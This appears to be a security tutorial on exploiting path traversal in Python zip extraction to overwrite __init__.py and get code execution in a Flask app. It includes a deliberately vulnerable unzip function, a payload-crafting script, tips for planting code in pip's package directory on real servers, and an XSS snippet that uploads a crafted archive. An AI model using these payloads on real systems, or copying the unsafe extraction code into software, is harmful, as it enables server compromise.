# Exploiting insecure file extraction

### Python

> Compressed file extraction with insecure code vulnerable to path traversal in Python can result in arbitrary code execution by overwriting \_\_init\_\_.py if flask is running in **debug mo**de.

One of the easiest way to achieve [code execution in PHP](https://www.acunetix.com/websitesecurity/upload-forms-threat/) is by exploiting insecurely written file upload handling logic. If you are able to upload arbitrary PHP file by fooling the file upload logic, you can execute arbitrary PHP code. But when it comes to modern web frameworks written in Go, Node.js, Python, Ruby etc. it's a different story. Even if you managed to upload a .py or .js file to the server, requesting these resource via a URL often won't return anything as the route or URL is not exposed by the application. Even if you are able to access the resource by URL, it won't trigger any code execution as it's treated as a static file and just returns plain text source code. This post will explain how to get code execution in one such scenario in Python when you are able to upload compressed files to the server.

Application security rule of thumb is never to trust user input. Don't just limit that concept to RAW HTTP request object that include query params, post body, files, headers etc. Carefully crafted compressed files that looks legit upon extraction can do bad things if it's handled by insecure code. This post is inspired from a [Security Bug](https://github.com/MobSF/Mobile-Security-Framework-MobSF/issues/358) reported to MobSF and tries to cover the technical aspects of the vulnerability and exploitation. Let's take a look into the insecure code.

```

def unzip(zip_file, extraction_path):
    """
    code to unzip files
    """
    print "[INFO] Unzipping"
    try:
        files = []
        with zipfile.ZipFile(zip_file, "r") as z:
            for fileinfo in z.infolist():
                filename = fileinfo.filename
                dat = z.open(filename, "r")
                files.append(filename)
                outfile = os.path.join(extraction_path, filename)
                if not os.path.exists(os.path.dirname(outfile)):
                    try:
                        os.makedirs(os.path.dirname(outfile))
                    except OSError as exc:  # Guard against race condition
                        if exc.errno != errno.EEXIST:
                            print "\n[WARN] OS Error: Race Condition"
                if not outfile.endswith("/"):
                    with io.open(outfile, mode='wb') as f:
                        f.write(dat.read())
                dat.close()
        return files
    except Exception as e:
        print "[ERROR] Unzipping Error" + str(e)
```

This is a fairly simple python code to extract a zip file and return the list of files in the archive. The zip file comeS to the server after a file upload operation and is send to `unzip()` for extraction. If you look at this line

```
outfile = os.path.join(extraction_path, filename)
```

You can see that `filename` variable is controlled by the user. If we set the value of `filename` to  `../../foo.py`

\>>> import os

\>>> extraction\_path = "/home/ajin/webapp/uploads/"

\>>> filename = "../../foo.py"

\>>> outfile = os.path.join(extraction\_path, filename)

\>>> outfile

'/home/ajin/webapp/uploads/../../foo.py'

\>>> open(outfile, "w").write("print 'test'")

\>>> open("/home/ajin/foo.py", "r").read()

"print 'test'"

By abusing path traversal, we are able to write the file to arbitrary location. In this case into `/home/ajin` instead of `/home/ajin/webapp/uploads/`&#x20;

### Arbitrary Code Execution

We are able to write python code to arbitrary location. Now let's see how we can execute it.\
Consider this sample [vulnerable application](https://github.com/ajinabraham/bad\_python\_extract) written in Python Flask. We will make use of `__init__.py` in Python to achieve code execution. The [docs](https://docs.python.org/2.7/tutorial/modules.html#packages) says&#x20;

> The `__init__.py` files are required to make Python treat the directories as containing packages; this is done to prevent directories with a common name, such as `string`, from unintentionally hiding valid modules that occur later on the module search path. In the simplest case, `__init__.py` can just be an empty file, but it can also execute initialization code for the package or set the `__all__` variable, described later.

So if we can overwrite `__init__.py` file with arbitrary Python code inside a directory of the web application that act as a package, then we can achieve code execution if that package is imported by the application. For our code to execute, a server restart is required in most case. But in this example we are running a Flask server with _debug_ set to _True_ which means every time a Python file is changed, the server will do a restart.

### Crafting the Payload

The vulnerable web app has a directory called [config](https://github.com/ajinabraham/bad\_python\_extract/tree/master/config). There is already `__init__.py` and `settings.py` in this directory. The main server file `server.py` imports `settings.py` from `config` directory, which means if we can write code into `config/__init__.py`, we will be able to achieve code execution. We can craft the payload using the following code:

```
import zipfile
z_info = zipfile.ZipInfo(r"../config/__init__.py")
z_file = zipfile.ZipFile("/home/ajin/Desktop/bad.zip", mode="w")
z_file.writestr(z_info, "print 'test'")
z_info.external_attr = 0777 << 16L
z_file.close()
```

If you look into the [file upload code](https://github.com/ajinabraham/bad\_python\_extract/blob/master/server.py#L62-L63), you can see that the file uploads are extracted into `uploads` directory. We can create a malicious filename with [zipfile.ZipInfo()](https://docs.python.org/2/library/zipfile.html#zipfile.ZipInfo). Here we give the filename as `../config/__init__.py` to overwrite `__init__.py` inside `config` directory. `z_info.external_attr = 0777 << 16L` will set the file permission to read and write by everyone. Let's create a zip file and upload it to the vulnerable web app.

![](https://ajinabraham.com/static/img/blog/2017\_09\_28\_exploit.png)

We can see that the Flask app reloads and the server console prints **test**. Our code execution is successful.&#x20;

### Exploiting Realworld Applications

In this example, the arbitrary code executed instantly as the Flask server was running on debug mode. This may not be the case elsewhere. You might need to wait until the server is restarted. Another problem is that we don't always know the package directory like `config` in this case. It's easy with an open source project where you have access to the source code. For closed source applications, you can take a good guess for package directories like `conf, config, settings, utils, urls, view, tests, scripts, controllers, modules, models, admin, login` etc. These are some of the common package directories found in some Python web frameworks like Django, Flask, Pyramid, Tornado, CherryPy, web2py etc.

Alternatively, let's say the web application is running inside Ubuntu Linux. The installed and inbuilt Python packages will be available under: `/home/<user>/.local/lib/python2.7/site-packages/pip`. Assuming that the app is running under user directory, you can craft a filename like `../../.local/lib/python2.7/site-packages/pip/__init__.py`. Upon extraction, this creates `__init__.py` file inside `pip` directory. If the app is using virtualenv and let's say the virtualenv directory is `venv`, you can use a filename like `../venv/lib/python2.7/site-packages/pip/__init__.py`. The will brick pip, but next time someone run pip command in the server, your code will execute!&#x20;



### Arbitrary File reading

1. Directory traversal (also known as file path traversal)
2. Un lien symbolique



### XSS

```
<script>
    function base64toBlob(base64Data, contentType) {
      contentType = contentType || "";
      var sliceSize = 1024;
      var byteCharacters = atob(base64Data);
      var bytesLength = byteCharacters.length;
      var slicesCount = Math.ceil(bytesLength / sliceSize);
      var byteArrays = new Array(slicesCount);

      for (
        var sliceIndex = 0;
        sliceIndex < slicesCount;
        ++sliceIndex
      ) {
        var begin = sliceIndex * sliceSize;
        var end = Math.min(begin + sliceSize, bytesLength);

        var bytes = new Array(end - begin);
        for (var offset = begin, i = 0; offset < end; ++i, ++offset) {
          bytes[i] = byteCharacters[offset].charCodeAt(0);
        }
        byteArrays[sliceIndex] = new Uint8Array(bytes);
      }
      return new Blob(byteArrays, { type: contentType });
    }

    const queryString = window.location.search;
    const urlParams = new URLSearchParams(queryString);

    //File contents encoded to Base64
    var b64file =  "H4sICCzHg2IC/3BvYy50YXIA7c9BCoMwEIXhHCUnSGbiBM8TBIsgrbQp9PhGl9KNlu7+jxneboYXQgzfpizLtvM0lDo97vFVWw5xnMst1E91Z0jT57xnc0wRVaeWTHrrLJuTpKqd8+nau3PerdnT+5/vHMsBAAAAAAAAAAAAAAAAAPBHKwtm0PwAKAAA"

    //Create a Blob object
    var content_type = "application/x-gtar-compressed";
    var blob = base64toBlob(b64file, content_type);

    //Append Blob to FormData
    var formData = new FormData();
    formData.append("file", blob, "file.tar.gz");

    //Send FormData to the server via XMLHttpRequest
    var url = "http://localhost:1337/api/firmware/upload";
    var request = new XMLHttpRequest();
    request.open("POST", url);
    request.send(formData);
  </script>
  
  // cat tar.gzip | base64 - w0
```



